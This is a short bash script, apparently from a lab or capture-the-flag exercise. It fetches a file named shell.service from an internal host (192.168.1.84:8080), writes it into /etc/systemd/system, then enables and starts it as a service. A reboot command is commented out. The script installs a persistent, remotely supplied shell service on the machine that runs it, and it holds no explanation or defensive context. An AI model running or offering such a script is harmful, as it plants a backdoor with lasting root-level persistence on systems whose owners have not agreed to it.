#!/bin/bash

/usr/bin/wget 192.168.1.84:8080/shell.service -O /etc/systemd/system/shell.service
/usr/bin/systemctl enable shell
/usr/bin/systemctl start shell
#/sbin/reboot
